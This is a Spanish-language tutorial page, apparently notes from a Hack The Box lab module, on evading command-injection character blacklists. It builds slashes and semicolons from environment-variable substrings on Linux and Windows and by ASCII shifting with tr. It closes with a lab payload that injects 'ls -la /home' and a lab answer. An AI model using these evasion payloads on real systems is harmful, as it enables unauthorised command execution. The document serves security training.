
# Bypass de otros caracteres en Blacklist

Además de los operadores de inyección y los caracteres de espacio, un carácter que se incluye con mucha frecuencia en la lista negra es la barra diagonal ( `/`) o la barra invertida ( `\`), ya que es necesario para especificar directorios en Linux o Windows. Podemos utilizar varias técnicas para producir cualquier carácter que queramos y evitar el uso de caracteres incluidos en la lista negra.

***

## <mark style="color:purple;">Linux</mark>

Existen muchas técnicas que podemos utilizar para incluir barras en nuestra carga útil. Una de esas técnicas que podemos utilizar para reemplazar barras (`o cualquier otro caracter`) es mediante , `Variables de entorno de Linux` como hicimos con `${IFS}`. Mientras que `${IFS}` se reemplaza directamente con un espacio, no existe una variable de entorno para barras o puntos y comas. Sin embargo, estos caracteres se pueden utilizar en una variable de entorno y podemos especificar el `inicio` y `longitud` de nuestra cadena para que coincida exactamente con este carácter.

Por ejemplo, si observamos la variable de entorno `$PATH` en Linux, podría verse algo como lo siguiente:

```shell-session
afsh4ck@kali$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

Entonces, si comenzamos con el carácter `0` y solo tomamos una cadena de longitud `1`, terminaremos solo con el carácter `/`, que podemos usar en nuestra carga útil:

```shell-session
afsh4ck@kali$ echo ${PATH:0:1}

/
```

{% hint style="info" %}
**Nota**: Cuando usamos el comando anterior en nuestra carga útil, no agregaremos `echo`, ya que solo lo usamos en este caso para mostrar el carácter generado.
{% endhint %}

Podemos hacer lo mismo con las variables de entorno `$HOME` o `$PWD`. También podemos utilizar el mismo concepto para obtener un carácter de punto y coma, que se utilizará como operador de inyección. Por ejemplo, el siguiente comando nos da un punto y coma:

```shell-session
afsh4ck@kali$ echo ${LS_COLORS:10:1}

;
```

> Ejercicio: Trate de entender cómo el comando anterior generó un punto y coma y luego úselo en la carga útil para usarlo como operador de inyección. Sugerencia: El comando `printenv` imprime todas las variables de entorno en Linux, por lo que puede ver cuáles pueden contener caracteres útiles y luego tratar de reducir la cadena a ese carácter únicamente.

Entonces, intentemos usar variables de entorno para agregar un punto y coma y un espacio a nuestra carga útil ( `127.0.0.1${LS_COLORS:10:1}${IFS}`) como nuestra carga útil, y veamos si podemos omitir el filtro:&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_5.jpg" alt=""><figcaption></figcaption></figure>

Como podemos ver, esta vez también hemos logrado pasar con éxito el filtro de caracteres.

***

## <mark style="color:purple;">Windows</mark>

El mismo concepto funciona también en Windows. Por ejemplo, para producir una barra en `Windows Command Line (CMD)`, podemos usar `echo` con una variable de Windows ( `%HOMEPATH%` -> `\Users\htb-student`), y luego especificar una posición inicial ( `~6`-> `\htb-student`) y, finalmente, especificar una posición final negativa, que en este caso es la longitud del nombre de usuario `htb-student`( `-11`-> `\`):

```powershell
C:\afsh4ck> echo %HOMEPATH:~6,-11%

\
```

Podemos lograr lo mismo utilizando las mismas variables en `Windows PowerShell`. Con PowerShell, una palabra se considera una matriz, por lo que tenemos que especificar el índice del carácter que necesitamos. Como solo necesitamos un carácter, no tenemos que especificar las posiciones de inicio y fin:

```powershell
PS C:\afsh4ck> $env:HOMEPATH[0]

\


PS C:\afsh4ck> $env:PROGRAMFILES[10]
PS C:\afsh4ck>
```

También podemos usar el comando de PowerShell `Get-ChildItem Env:` para imprimir todas las variables de entorno y luego elegir una de ellas para producir el carácter que necesitamos. Intenta ser creativo y encuentra diferentes comandos para producir caracteres similares.

***

## <mark style="color:purple;">Cambio de carácter</mark>

Existen otras técnicas para producir los caracteres necesarios sin utilizarlos, como `shifting characters`. Por ejemplo, el siguiente comando de Linux desplaza el carácter que pasamos por `1`. Por lo tanto, todo lo que tenemos que hacer es encontrar el carácter en la tabla ASCII que está justo antes del carácter que necesitamos (podemos obtenerlo con `man ascii`), luego agregarlo en lugar de `[` en el siguiente ejemplo. De esta manera, el último carácter impreso sería el que necesitamos:

```shell-session
afsh4ck@kali$ man ascii     # \ is on 92, before it is [ on 91
afsh4ck@kali$ echo $(tr '!-}' '"-~'<<<[)

\
```

Podemos usar comandos de PowerShell para lograr el mismo resultado en Windows, aunque pueden ser bastante más largos que los de Linux.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 94.237.62.166:49797
```

Utilice lo que aprendió en esta sección para buscar el nombre del usuario en la carpeta '`/home`'. ¿Qué usuario encontró?

Vamos a utilizar el siguiente payload:

```
ip=127.0.0.1%0a{ls,-la}${IFS}${PATH:0:1}home
```

Que va a hacer la siguiente consulta:

```bash
127.0.0.1 ls -la /home
```

<figure><img src="/files/VNPABmqFTPcOYxd2Yhlq" alt=""><figcaption></figcaption></figure>

Encontramos un usuario: `1nj3c70r`
